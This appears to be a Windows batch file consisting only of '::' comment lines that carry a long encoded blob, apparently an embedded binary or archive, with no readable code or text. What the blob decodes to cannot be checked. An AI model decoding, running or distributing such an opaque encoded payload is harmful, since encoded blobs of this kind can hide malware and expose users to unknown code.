::a[l$$gbcF{a[l$$lC[Q?f_&molC[Q?-w/h2f_&moE?B()g.[HUf_&mog?+/gMTDSAZUwz,MR7K3E?0PW|ng!BU@t$HBO~@cZUwz,@?e/KjGN|S0_kY9o?_}KG~Q-CZUwz,8dPCb)O4)H2n4Vu)@t#4hRq,C2n4VuhRq,CE?hm72n4Vu
::E?hm7Zt&ztW_,3_}i2h#9}jIEZUwz,c6JP?lYx_bu_N2GCiP=!;ltS;^ujoDX=1JT!gfN0=n~UE|d0~_Tl}Rf#A#k(Tl}Rf)@KNUObW(3)@KNUZ4]92//a01~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~;OO6!HUgn{}(Hgs_!Mv2em8Sj#.z.H0#~~~~~~~~~~~~~~~~~~Op-v|efAbSEN~~~~~
::ZUkQt~~~~~~~~Op~TT;p=S9);~~~~~~~~~~~~~~~~~~Op~TT;p^3p(t~~~~~~~~~~~~~~~~~~OpG,|MV_1o=D~~~~~ZUkQt~~~~~~~~Op~~~~~{/C[@~~~~~~~~~~~~~~~~~~OpG,|MVKA-,#-fPyJt^[bE~~~~~~~~~~|fAf$^3Msy
::hv#FU~~~~~y!j-2]DkT7~~~~~~~~~~.56xh~wwTOp./3Pk/Z4~_1o=D~~~~~Mv2C{~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+b3LRPZnmE~B64RU+VuYf?iHptEfA.3CM^[9Q&1k9QS(O)TWP8U3AJtUAWl.}wgL8ADRww
::DeH}k1v]K3~~~~~~0}gUmTT+MmTT+MmTT+M.)=dJ}@9q[mTTeBY@BW5.)=8cmRRF}.)=jvmRRF}.)=|WmRRF}-/751m~~IB-/$O[m~~IB-/7jHm~~IBQ7tRamTT+M~~~~~~~~~~|d-@{cQ!@nLJrM@~~~~~~~~~~y1#j^OZle=~s;9,
::~O[U@~~~~~zY3=I~pS1!~~~p=~TT;p~pS1!~~6gGp^a^8~~~~~p^a^8~~~~~~M7&m~~3.P;x.z6~TAOh~~~v!~~~~~~pS1!~~~~~~~~v!~~~~~~pS1!~~~~~~~~~~Hgs_!~~~~~~~~~~WLxy;gn{M]~[4QE7g1C#~UMd1?3G~,~1qR/
::tYr@J~6CW4X3Q8vHBE5PQbC,b~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~4Nq{~~6gG~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Di8o=)/b|9^Yk&T~pS1!~PPrW~~3.P~~~~~~~~~~~~~~~U.[2^D?-$[)20V=
::t)f82~4Nq{~pS1!~P]k$~~~~~~~~~~~~~~~Mv2d^Dyc2B9Di.gDgMe#~sZjF~~6gG~4!sr~~~~~~~~~~~~~~~Mv2K;D?h@X)20V=?3G~,~UMd1~~3.P~42MS~~~~~~~~~~~~~~~Mv2d^|d]^@~~~~~sSc_x~1F?T~G((z~4Nq{~~~~~
::~~~~~~~~~~U.[2=/uxnx~~~~~8l=;c~X9X_~pHSU~;K=8~~~~~~~~~~~~~~~U.[2ZD?EG&9Kv$D7g1C#~[4QE~~3.P~UE6[~~~~~~~~~~~~~~~Mv2dZD?-Z0Adwf]X3Q8v~6CW4~~6gG~1Q$}~~~~~~~~~~~~~~~Mv2dZ~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/QOmR/QdoqMEl,J$(Fd6k6#Q+LOn#]/Qxl0GR4mnqyFFWCbI6Q$@zg{qbPHxhza3//Y}eH7fK|i~~PX]_gQk}I~Tm|
::ZTtuoq1B]n}H0a&$0muG}H9nVE#VTS~WmXa~IcD}GR4meqNvCJIiO@$fKyQ^fKyQ^fKyQ^fKyQ^fK5r[P5gYs~~~~~.^V&iD8pEoaC7K-/x@dA3{y{hGtx?bIG_Rdq@)/jk[Sbk/QpIoiQOKuPFlIHOQG,}~f&/n/QpIriQOE&P0(0w
::/x@BXqGNDpIO~75{9jMBp{;j.q?_$U-EoGc/Qd^j/Q&9T$09Nfk[K3v/x0FU.yNt;G04n-IrdN+q@).t~A;m1/Cv-a?!z-jIe;=,cyWjeP5gYs~~~~~cyWh|cy]1w7fS.N~~P81/Qd^j.^s5RGh.^{U9F0^n8abs-jlxpO=NL]T~w2E
::k[dKN}!9&sQ00|L/x0F2EGv+8k8M-^P5gYs~~~~~cw?vmF0I41~gM$RU.[tcPn03xPn9_cMhg]t71Kv=k[S@=/|Np;Hgsl@Mv2C{.^4Qd.^s5RGhhCYG((E]QOS5&.)Q0sqC|OG.)?OBHM6xuQHAbf.)Qy.qC|O6/QpLA.)?OBn8#r~
::QTJS6.)2/IqC|Hhk[r-3If40-HHx.0)K7G{-ubV?~8+f|~pS1!P(e,Pk/xazO,hnQSsq{XcyWjeP5gYs~~~~~cyWh|cyWh|cw?&d{9xOoGS{c]IO04@iQOC#Ox|T0q@)/jk[SbkiQOKuPyq@Q~f&0yOQG,}~f&/niQOE&PmEg.pY;tn
::/x@BXqGN0D{9jMBp{;j.q?_$U-EoGc/QOVB/Qd^j/Cvy4qG+fN/x0FU.yNt;G04n-IrdN+/Y}e+p|9{G{W.-0?!z-jIe;=,cyWjeP5gYs~~~~~cyWh|cy]1w7fS.N~~P81/QK-2ie}^)O=N^z-?LZ&M?T|uQPv.x}5{[yq_Y=nk[dKN
::M,JD9H^bxF$cr5.)/b|@cyWjeP5gYs~~~~~cw?vmF0NOfk;8E_U.[tc/|NGJ~~~~X8l8Xx8dySwk[S@=/|eaRHgsl@Mv2C{.^s&#ie}^)O=NIpIf4xkHHx.}.^s&#-hgy}O$UaNIf4HCHHx.H.^s&#KqP6HO]Azw-kV?vI{(_zHHx}J
::.^s&#Ghlg5OZ7!9HHJk3.)?Gv)K7G{-ubV?~8+f|~pS1!P(e,Pk/xazO,hnQSsq{XfKyQ^fKyQ^fKyQ^fKyQ^fK5r[P5gYs~~~~~/Q-QJ$AMl,Q_gzf/_p5H~T36P~TWfHh=1i?iCw59/W2ennT#YD.],FqqP3[r{cP^}/x0FC/_kRF
::)o3Xa{9xOtG0sfwp;01ecy]gd/Q&i=$09Nfk[K3J.yNtsOcS.fk!FQ1{396y~~Ox,cyWh|cy]1w7fS.C~~P4?/Q&i=q1z#=q1zN^$0tKAq1Aywq13[Hk[dKNQTJvgQz]1MQ00|dESfbEUPgsD/VR^q/VRJ/GhM$AQPv.ZI;2#PIf?HR
::HHx.H/Cvy4HHx.V/VRJ/yBBsgQ00|_y|!?,~.,7Ik/JTeZTt+^IDSLWqGS@]I{Dy_k!pT?~Mv=wMo|BUEE_L^8etaz.^Vph$tsI,iHWB+qioxr}H&b}.-V~HijnVcdm9CN.]PFxcH2?k4W;Ky}u1DYGhMP5G-N#dPkD65rv(p7n|4|s
::.3R9X!Rn|]{r+4HU2p85~~~G2/QOmR.?A|k/Q-xlqil{)k/R1D~TT;p/QpnDIiO@$fKyQ^fKyQ^fKyQ^fK5r[P5gYs~~~~~/6m/uB.1c8H-$5^H/8rvk/&6AI05&1I.~/v~~~~~/QOmN.^4@6B.19^qo-V{~~GvtcXL/(/Q-,UicfXy
::w(&pm~~8}efKyQ^fKyQ^Mo=nJZW$E,/|NUJ~TTUjpC)?6~sD9JB@Z^AP+7yqDgGr1mcwf/y]YX@@yQ.jHPQloDgGoz!RlV0m0uvBmtcQyP+7iUVKS&gpJ@&h~HqIgHu_j=mWHUlPWwo.~po#t?]tycP+xmmcwD(6ydC./K]YFPydCzO
::C5ilIIGWg/V$t]1p5/(g~4qIQ~~P4Z_9xI9ldkOign5Q7@T(Y0qB0+x~TT;I3GD$a3C#l!8H46h~8Ls21oU=J)z9!n/TO|NQGI.8VX4@zZ06??~~GvYpoHB@~8Ls21oU=J|{Ec3/TO|NQGI/hVX4@zZ0M7)~~GvYpR4}G~8Ls21oU=J
::D!2v~/TO|NQGI/MVX4@zqO6wt~~P?_!C-rQBNMF1~gXARZ0MfZ~~Gv=.];]m8H$to~8Ls21oU=Jgy11w/Q&ZW6R$XWGzk{xy[l#=/QB+n$$$//~8LpR-J@$6.ai1PU.QYt/QdKad8!u8~~GTi|dyDo.^DAp.H49_fJTW-/Q^Ir38W?V
::/QB+n$IuZ]~p^x3S]3,S{OI!dg619,mMZPa!xCa@edn0,ydC.9hJ^xvydCz4HVCM&jzz[qcwDe5/QNVe3|#qZp-U(P~|NjBM?=//lEHt9VKS&UMic5o},vW|qUPA/ZA/yMZ2@r{m]xb[~~GvY},#YR{OI!O~~~~~{OIXF~TTR!/tBX?
::~~~~~{ONm}~RRMEP(9po-ePE/~8LGc1SWvKqF7P3;P!de=pN-J!xnT7/QN[z/TOH@/tBUAgn{M]~8cSC.?]plq;wJ6_CAdc~T6C-gn{}Tqf&OUKLsrYgn{mONZL?jI~Q7Oqf&z&4dp+8~8LG|zcBjr1^,;K~8Ls==e;9URHj+j/TO|N
::WE7qBgZ)gQZ2MPp}U7-;~~GvY},uG-Z2MP|/tBUA[bnih~8L8vK]YFP/Q^IrX7+Vk},#D_/Q-d}},ZE^~~~GIJK&ZwqF3{~WoVV-},vD[Z3;[&ZA/0l@yd;!k/R;}1JRvE/TO&?Wh~KNnQj#DgZ)VsK=Jb;1&)WZ/QRso~~~~nq[OZ_
::~~GvYmR|yjpLp(J~8Iw.taW[dHB+lv1r{Dk{L]{e4N~C2~DyLCq5bPj~TT;57SHwQ~~O0[IiO@$fKyQ^fKyQ^fKyQ^.^Vr(qg2}RqD;h?qDkq//|N1+~~~~^,A+J@z0Xl^~8nGI{9xTCqyw1].Tll@Kogt;AbSF0~8LPz/xF}XPiguT
::qDXx_TtkgB}{X|3}fE.v.QF),],fv1w(jw$~~PINWj(cL.]s-kZ23ER~RR6G=pK|oCJLb)PyBY?},#]22{|3C0J!YE8H?^_~8LGc1j9|@$(Fk9w(J+Y~~PFiEZ,q;ZO_Zs!xC_AaXjXw~~G^$0m{c{2ASjO)~UHB54^l7fKyQ^fKyQ^
::/QJ&kUtq;dEkZctK?ODgZAFXtw(J//~~PINPb@Gc~~Gv=TOjVNqfW2/w(avS~~Gv=$Yb47~~GvY},#X#Z2MP|/Q^IrU96mMmMqI/d&S.+sG-@=1EdF4i-@qV1z,Id1lQ5c.;Khuo[,=a.1&rAt]6So/QNVeWE7Zm1EdF1/TO|NXLq5N
::g6UO|qfW2/w(R#p~~PF(/QnbL=S9A^/QpnN@C13,aXR,5~~GvtL;CwnfKyQ^fKyQ^/QJ&kGh.e?1a6q4Y,tuHqX8~CT2nUZ1a|pJkPPIgy1R=+/Q5Gb~TT;Jk1[&f~TT;?qkiEq~}S{Jo[?eA/Qxr~$A/m&=A=gi~8L8{fn7N8HPm1,
::lLLrjqnTm/U^q=Mp6JoH}Pe(.PbP_G~~GA]Z9BKg~pjdKp^aZN7ZXpk~~PXqLwKY3~M&5Zp^aZyq+Z/a~~8P0vn];d/tB84p./3PEU]}G~4b/MGa[R}p^aZ56$M3K~~~#L2tj_T/R;&tZA8^?/QnYq~TT;yZ2MPpPiguQq;wJC_CQl!
::HB+h;1okj$],yyV},vV?~~~~nqXi&lqXi&y/Qxl03Qio_1v]+OpPl]pG&2A!~.,QL~~GTQFOm=fO#Oq!}?NM^~TT;!=Hq[^~8n8h/THTI~TT;5qXivk};JWo!xCuT},Z,[dK!PZ1v]NBqkbW.WjpLRZciFz~8LsQ1jzyR},#Yu_WbJX
::H6bH~1JCsQlF4=]~~GvYY,t5m45n6d~8LOg[bk~omGJ&m4{Wb{~8Qopm0|Wr1hj1qU.QYt_dD..~8LGc1jAc3|{@G9/QNVeMLGJ28Giqz~8fg(G&2A!~.?5&~~GTQFHN6PQo,8G6u@Nc~~~#LmNHeE/R!,jQGJ)?qO;~Lp./3K$A@RG
::$eT$V~DPkM~TT;;P(bDX~~GSZZ@c}P~8p;i~~~&PqC=o_qrywtwQoe&pPl]pG&2A!~.ET2~~GTQFOm=f,KZ#n}?NM^~TT;!=GZ!m~8n8acFZs]PbH#.~~4#S~~~p[62;SR$b#[i~8LG0U9F33U.QYt/Q&J2{OJUT~~~GL5?haLmM3|R
::$A@RG$F/cY~DE#o~TTUuiSF2lZw?9l.^U^]~TT;yZ2k#$qF!)J}#MkNrLrNFGv#5Sp}ELd~~GW2dvwZSU|5X}~wwzo$dokP~D8PuP(rj_~~GSZ$CNtw~sDc)Ghtk;/Q^_0My23Y-r(0s~DJNt24UW.}Pe(3P(bQ6~~PF[gn5Q7.^Q2)
::/QnLJ~TT;-qiz-q}#QyAHCI?Np}+?q~~GTQFOm=fic(Ti$zwo}~~~gB$432Q~8cSC/QxC]}Uc^=~~Gv=TuJyr/]uuM_X|yv$(Fi9LwdUj~M&5w~RRBh|G7u3|pROF8VlqeKv4IjBBDmAmGaYO~TT;-ZT2pKB[Y1O$zwo}~~~V38Mnq5
::q+Z/a~~PnS.a,Kwq;4([~RR6-qnc+r~~GL#L?b5_k/uC=3k&J{E8P-J~Mck2~M#)vEHCG]~4b/MGa[xI~RRBvSdZ,S~Gv}GM}|Kf.^44#U?+J}Z7Xz,~~G^$P&]@G/Qxl0/[7rfqXivk.?t~tq;wJ6w(^n4~~PINPb@7Z~~Gv7ZciFz
::~8LsQ1h!@r{r+mx1^?Z6lf{)z8H$;&~D/B[P87F!~M#3y-y#mp~D+O7!HFQ)qntrk~~G!#1}Vl{GG4F9z&Vp-3GD$a3jG6FMweXtB5)ZQ~g7$0q{.0Npc)I0/B_o8U.QYt/R0bG/Q^hz/R1+y/Q&20q{Dkeq;Id&8P6m)~DyEN{OJU=
::~~~pJp}ELf~~GTQFOm=f9KovX}?NM^~TT;!$na6a~sD|a@yFSl/THTI~TT;-qrnPj~AHHi1Jf]k/Q^IrU^3!3U.[2Fl54@rqntrk~~Gv7$CNtw~sDQ7gwG3A)@s,$},#Yu_WbJXHB+SI;OW|lmMqI3=5JYw/R!Ilq_H).TOR^(~~6gG
::w(xU7~~Gv7ZciFz~|4Ijqsfqq},s]Xq?atD}#6F(~~PnjE[|al~4b/MGa[j~~~~p#SdZ,S~~3NdRwZ1p/R;5)Z7Xz,~~GSZr617q~8~55/Qxl0V8^tS~~GvY},Z,9Lk[aAk/uCZpC)$4~s/9#w(j}X~~Pwu$(FF0/QnYe~TT;5Z3ss@
::8PR=]~8pgb~~~~nZ7XPe~~GL#Ll-Fa1^?jbI05v/kOQRc;wCwnU.[2BZAM=,FGQsZ;wE|6qntrk~~;O}ZGwOp=Hotsq+Z+C~~GvY}#/Z!EJ}tzgn5Q7GSi@,~(0M!I~Td]qoFZI~~GvAlnJ)yCF48aU.QYt/Q&9T{OJUT~~~pJB},3E
::MENbOq;8GgLwn=)~M#$iB^fSf~g7rn~kHtPli52)~Mq.KaXras~~G^$0m{c{3bm$1YvoP9)~kxT54tv{cD(jqoMLn3/D+#DFc^AmK1#f58;;c^nGqd(_$!IZJsk9/.Ck3.Z0+n(Js{B}PZh^qt1ikuxHS#.pk3kY},[#!~pS_v~0Ge&
::~h0ya~(op^HVKt{p|bUJHVKt{HVKt{pxQBxpFxzRGmF)jGam#hHVKt{Gy&joHVKt{OB,{rOu65_O-ZkSP!54lPqXXIH4R/cfKyQ^fKyQ^fKyQ^/QJ&kGo5v7,Gx[]~8LP3!hhYhdmt!x_1o=D.^s2j/QJ_MHP[=1qfU!tqf(z3lnxfH
::PRnHnHgslWE4Acq~8IwW1jzyrm-d75},#{(~2xCA1xxR2.]sGaqfU]Zqf1^wq;wJ6-hF.xk1M#Ft!J4w1C2_2~G1AM~8Ls21_^L1$]~7w~~GvY},u,^},uaX~~~G0},uIB~~~pJ0J6IR4ymM8~T6d7;T}8gHP./3ZAFX|/TO|NQGI._
::;T}8,li(R+~M$UMKNFsw1_r[,zTVcc!jIUeXqP17w(a3u~~PFi/QnbL^3pwE/|el9~~~pUIiO@$fKyQ^/QJ&kGh.e?1^4^$T4{qqTltej$t(._qw9}CK=JF-}-@{P.?7B1q(,~B|SID_=tVc^/QKe@}-@{Tc5q8mGcg/aF0+USAo$+T
::mM#j5{L]L~m0RI{p9|Og~8LG@Gh.o-P(iWv~~GSu.]U|@q?/D3e1=V@;T}8yllEM{~TT;N$L@gY}-@{D}VU,{q;wxH.Lw!PqCX,uqi80D,D&;A},vWjmGTLKq{a+8/Tp^xEx$,#~AHg(/TO|NU^3X;sb?(,llEm-~~~~eHPzFuU9FAn
::1JC6cfZ#bvk/Zxz},ZyipQ+U=r,x7{q;wxH/TO|NU^3[uso^-wY,3cwp/fR$TL+{GrKa-2-j|mF1_&lcuv!rLm0!_I[;,6e~AH!{}x32cDBI-03kKAr~~4+~$38bu.Lw!PqC#Bxqi8T!,D&;A},vWjmGTLKERv^h~AH[A1J~UPZGqLk
::qF3{~Wo]62r,x7{./k@[/R0(./g@y4B6[]7S;H;}I~Qf1qC|wq/Q-Nj+~0p@HPzFuUZz#A~8Ls21J~UP|Lttm=pN-Jq?BnE!xnQf_g[5BI~QX}~TT1//QNlb@F@[(1SYQ1LPj7{}~CnI}~&dmfKyQ^fKyQ^/QJ&kGo5v=Ey2}[/R69/
::qGlssNVrAVOEK}]};JWSq;wJ-!j_NZ},#X#Z2MON/Q^IrUc]{?w(&&}~~PINPb0b9~~Gv7.];W;Z2MO?mMZPxq;wJ6mMqI/dK!HFs@.f-lnl6b.sy(g/QNlbMhg#WX#qIJpK5Xa~8LGc1oOhy1}Vl{Gpjh=z&gee3GD$a3jG4,Qs,-=
::B5)ZQ~g]N4qC~G.Z2G,Oq;+u0q{tt?qOOQ1}/!we}uX/BSWlfq!xCvPG/d)9~8LGv1jzyvLPhv.fKyQ^fKyQ^/QJ&kGo5v=EiUVGidn)y1JLR,~~GSZpj0ub~8LsQ1_^L1NVmHN1^yy-};J]54-/gl~D/BM0z{oW1_^EXQ81V,dR93z
::qowFF~~GTF~~~~!/QJ&kX=reMLlA8G~8n;-/QeOqq1hL2_CQd6~T6d&s@.fVqfW2XEZSbO~wwTO~T6C$s@.{yldb$ZGv#ns/QNlb|e}MRMrx)v.^V_GqU_knTLI&dMbN6#}~OJV,1V5A~s/2Y/Q,zBHP|)vd&.G{/R;J@Z2L+/qUKXC
::=K0Rf/xi9R!000qIUt]{.^;NUqrUyXGa[q9~TT;560AL$~~~#L1}mC3/QJ|-Wh~oo1S=eR1I15i~HUtv~8nO[3TG(T}1b@2~~6gG/xwjJk/R;Xz[zAyP(@kH.^Ql-38bz3tL71B_5gMF~8Ls21oU=J3GcRJ$(yB^&Dd6e{OI!1~RR6G
::!xen/1Je=Q1^?d@.];I[{[9wRk/uCZIfGd|/QNVeQGI/JsGkhgqfWt,$(Fk)w(vV{~~4qv~~4+~RT61Gw(uav~~GWA,}nijH.7z#qoy_q~~GSZ~|4ISq?ccY2{|3pZ7Hv;~TT;5q;wJ6};JWYd&S.n1o(4S_DM[Wo[,=a.];I?l5g=-
::4el)s~Bj6v~M&+?~ww@O4dp|y~8LO11JLoy~8S!]Ga[a|~TTgp4?;xU~Bj6v~M&+W~wwTEq?_W$uJPiL~~;O}jQ2iQmGJuNllEMV~wwTEqoir9~~GvAlnJqdqn/?/~TTgpCiRKSHP|}H~TT;pm0|)W/I@]Ci8s(a~~~~nZ$fS,~~~~n
::qn/?/~TTgp4NnKT~XAN(Gj7bfIUt&X/|e-I~~PuPM}kN-}d/PJ,mL9v1JC62$YFwY~~GvY},Z,A!xfKiw(j}8~~G3)yQX#hmpw)OUPxT$1JLoy~8S!]GSirh4b=NK~8pzV~~4KHqX8p[/THv&hvUh4w(j}8~~PS1)Q,CDpJ@]x~8INo
::)|JiGZO=8j~~;HWEZ.&6,mTV?1x^}~~T6dl8tzW8=PoPMs@$,z/t/j7k/R;nqn/?X~TT;Nq8IQZ538Rzm0hiCEZ$a?mNHNt]+[a5$j!jh~Ui5Apx}Td~~~GDKA-,#cnn.r)|i93}1~dV~Mq~o)T5.zZR.Po7.{n+).),lPKF6U|H?cz
::}PSr=7.{?5).),lPNM)SY,A}ZqiWURmNsc9d}aQ#fn5wrk/u$)yQX#hmpw)OMz=md)z=,mP5gYs~~~~~/TONac5qHk@Zl9#?!Bn_0,lv6~.-B~~~OJcUPgsD/Y}&y7|H)c~g&b~FoO^w/Qn3ugn5Q7hvzPihvm|vY,Am.llEU,~~~~,
::Z7?1;~TT;Kq?aA$Tk/#TlIvyqmGJu-},uXallEm3~~~~fHP0P6cFeG[$hm@C~8AaP)z9{Xlkxc8i-CjDU.QYtmGan^p[]$dT(Por|tSE3-MhYym0hn!p&cYchvmz^Tk[4&.]UOW4ws$A~8Qfmq;wJR$(Fi_HP@i6@i?iy/QN),tqp!o
::p&Gi=k/u);}i2ea/TO|N9DNke4L_MH$S]MUP5UP|P5gYs~~~~~/TONac5qHk@Zl9#?!Bn_0,lv6~|87}P5gYs~~~~~/Y}&y7|H)c~g&k;$0a~dq+3@/~TT;5qH/dcZO$eu~~;O}=I^,nLlA8Q~JAU~l4U$|ld#OO1jdX!1jQ@u4+)mc
::1JLoy~T6dt4L_mppry/51j{FxLl-r~+b3LR}~E?{}~oCS@j@kafKyQ^=e$4pTAbFpMblgqMbi.v/QE+;$2~+aqSpzd.^;iV/QOB}/Q^C2.?7+;~IyJ|/Q,H&PXg2A$AMl,Pa[B/0|4zq~pjL]~RR6-q?_W$T3^/.g-bll$(yB^XL+z^
::/Qdj6g6UO|$(Fd=/QN[3k6vS~$(Fk3/QN[3w(R}l~~s}+~RR6-qf&Q3Z3U8p8p6nk~8LsT@FE&c/x18C~~PuPBij5y}Kio)u7$4^mMqIqqXivk!j_5vfjd&h1J~UP3pn.u$(Fi]/QN[q/6.vu)|DOIcDGpA/QxfH/QdhK1Edi.$(Fdm
::/QN[3k6#Qi.5P3!}-KxO/6s;U)x]tU|~~0=cDGpA_X|yvI~g!Y~~GWA{r+2r|d,!J/Q^IrUcP=/}HeI2w(^1r~~PwuB^-LfllE1u~TTUjTAlB1~~~~f_Mm6Jz^.1O4;HpNiVJA}/QB5POW&cR~M&+;~TT;Kqf&Gtq?ZzX~~~~nqX8~C
::/R!N,4CVu{~DiRUllEmu~~~~{6g9C}9bR-^qU8}1HPTO!IXg~z.ngf{mM#~,qyniyqVYKSZAX#]qC=UcKS_=hk/ujQEJS86k/Rg~c5Fue0,UCOc57W~mXoQtMvvOp/T~{9O6!HU!j_5vC|Zn(w(hqW~~s0B};=c_ZA}?aqFmy2f&k,J
::q(npcWou3f.(!I2IU}o9W}TNEkPHH7le4qrp9aXLqU8}1=nn-G4?w(g~D5.t/TO@&}c^I6p^$BPHCI?H{[PL^k/vrcUPgsD/Y}]-6gMT1)ya9hll6a+GQ{epqiA0Q$WpmfEZD,./QN[qw(RZd~~Gv=|~~0=E-X.b=Ho34EZD,./x?t{
::{P!5OWjM_H@.F5I0r=Kc@1#y!fKyQ^fKyQ^fKyQ^.^Vzn$by)~mGqi#!RL80NZMD9$0crOqC4m2BB/g{qoY@ZIW~HT3k-.Elepj)/6z_X4NIE./|e^;~TT;NB6qoy_VH3TlwP(AIiO@$/QJ&kGoj?1/|N1j~~~~nqoikt~~Gv7FUgB^
::P(,lo~~Gv7P2owq~8Lpak6#Qi-jLf6k/Rg~P5gYs~~~~~/Y}a0$X6$9)yuiE_Ysr!~8pU-m/Y,t3b$(Kw(J/G~~GvY},uQ?$(yBu~T3XGP+7yn4;HG3qX8pV/QEs6qX8pXP+aeXq?MswHVZ=5~~s&GHu;YArNd4C~~OxK/D#,J.];Dp
::$0c7n^S1FZ/TOpIMKo/T|fx-=~8Iwm1r{XH.];W;Z7H&J~~~G0},v)W~RR6-q;wJ2!S](eldkTX1JCsQ{n@diU.QYv~8cSo/Qxl0z9ecG?Ugzz1Sqkyp^aZyqfWte!jI6}w(j}~~~PLgWo&)?ZOu0P~~Gv=$]~CP~~GvYY,2UD!RLz$
::L2u+&1^ko~~p^sX8Px(|~8LO11C2_2~D?qX8Px(|~D.Xu8et&A1dmm$~T6eeHgsSOq+39r~~~Gf~SVxIq5bHC~~~~n7S;4z~~OcB@1#y!fKyQ^fKyQ^.^VPo_1o=DHB+lx8E7lfA~A~pfKyQ^fKyQ^fKyQ^.^Vr(qg2}e/QO/|LwCQ9
::k/uoq}vekhidw=ylSB@m~sD|aGa9P|/QE!KhE&)v}f4Sgp./3wqo3fE/VhfO$(FF@/Qn3u=S9A^/TO&?XLq-wHgs_w_YA,B~8LsQ1lTp9I{?xu1^?jbI05v/kOQRc;wC(DHgsSOZA8^#qF7P36pvHn/Qn3u=S9A^w(hc9~~PFi=pN+R
::qfW29/Q&57qdVZY/QpnN@C!U6Mo|Sf}~OJXEiklUidNt(1Ib)G~sD|a2Ig&Y.^D{TqF$?r/Qdd@hE&2u)Tnm5daMRp/Q^IrU^3!3PKC^Ll5gcrqs&(jL86!O@j@kaqo-5o~~4J?~wwTEq+396~~~~^{r+/s1lQxf|nlH7.a,|;Mh&GZ
::1R70vt7T1T@,kHL1Sqw=~~GS=)Tn&@8Pxy/~sDz@/QB5O|2eZ]mG#Wh38E}f1SY0MK~bVN~~;O}^)xGH$(Fd{!j_5vCqyjOP$Y$e},vIg{^lE!~~GTi|nlH7qi&Q$1SZfbJldcs.^D2[$(FnTm!JZr_1Ej!~8m0cldkcKGj5&S.yn|I
::62an!m0/#~X+]9pU9FAKidd=G3h{v}/g@IpBBy^I/RTn5/R62/B[vP_k[]^_I4KT{~4wl.3,,J0pQkd+FU6odWTcAj+DhW2$by)O/Q,8MD1Z?+UPgsD/Q-dy4?;/~~DDVXpx/OAEZDnR}HMjC/Y}_Gk[Vtr,K9&dE#@&YIs4q[qi=J+
::nRHiAHP.W)P57erqn/iQ~~~O~4KvJH~sDQe1R77JcX{3[qe5hL.yn|IO^OBHqiA0Q{|DU=.^U~TX7N=/$0lQY@j]1AIiO@$fKyQ^Mo|BUEk=0/pL-!a~D+GWPKC^GZAFDRP+$!nPKC^d},uE;qF7RqpfVOI~8Ls21^,JX},#Ybq;wJ?
::ydC./0&iKmydCzG1oG~L.]sy44Kg|~~8Ls21J~UP#|QXn/QNUYw(^(E~~GvtL;CKe/QJ&kGo5v=Ei;5iK=jPZ1JLR,~~Gv7F)Y^}1_^xHldkQq1^yy-};J]54n(+3~D/BM68akO1_^^8fz]7Q1xxh2lwcfKgnNNh~RR6-{OIXF~~~~~
::w(^++~~Gv7.]UQXKLsrBPXgtdI{?_51oPO{L49_]fKyQ^fKyQ^Mo|BUEELy4~ww0c},#7q~wwTR{r;)M3{wM#4iKzD~8LPG/QB5O0&Fi1~~~~~mG#WhXq]]p1xxC]ePG+d~~;O}M&d_y$(FdN!j_NufuwQ-OnN.C},#Yt{^lE!~~GTi
::|nlH7qi&Q$1xS}M}5kPF/QEU-$(FnT/Qpn4075~nI{?3bUtbfLg6p0v~TB0WOnNQg1,UuJ~TB0$OnNQg1,#+h~TB0#OnNQg1,(US~TB0aOnNQg1y22{~TB0ROnNQg1yNre~TB0rOnNQg1?}kn~TB0IOnNQg1?r},~TB0COnNQg1i;ZF
::~TB0NOnNQg1iZKb~TB0-OnNQg1ik;O~TB0?OnNQg1Ftt8~TB0kOnNQg1FKo1~TB@pOnNQg1wMwX~TB@HOnNQg1woMB~TB@;OnNQg1ksq/~TB@VOnNQg1kqeT~TB@[OnNQg1kw89~TB@xOnNQggpdxd~TB@fOnNQggO4]i~TB@KOnNQg
::gO${(~TB@5OnNQggOiPG~TB@yOnNQggH[,D~TB9POnNQggHRX6~TB9sOnNQgg4HYm~TB9gOnNQgg47LQ~TB9!OnNQgg4?G@~TB9MOnNQgg80Q2~TB9.OnNQggD^8!~TB9MOnN|#fKyQ^fKyQ^Mo=9gEy2(NE|@yDXLq-ZOZ=D(qfaX5
::4{pNA~Xt{8LPh$mfKyQ^fKyQ^fKyQ^Mo=9gEiUUpE|@vWMrA|#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^.^
::~~~~~RKd0l~~~~~IZ),~~~~~~nKj.c~~~~~i}G2J~~~~~Prg-,~~~~~gte3X~~~~~6NX#A~~~~~|}uhj~~~~~2}7x(~~~~~$^Ct.~~~~~ak4ga~~~~~rO8]n~~~~~fLLG1~~~~~+Z]i0~~~~~i}1]x~~~~~HkZ9w~~~~~VrX?M~~~~~
::!,9(@~~~~~/T{sa~~~~~zYndC~~~~~t^w7k~~~~~7TJO}~~~~~&o,du~~~~~h;/yd~~~~~fLnsg~~~~~5Y$R3~~~~~iE-{h~~~~~G{Wcn~~~~~;XN=8~~~~~!}++0~~~~~|}feo~~~~~2}_C~~~~~~Yte]!~~~~~#YKeW~~~~~RX]0I
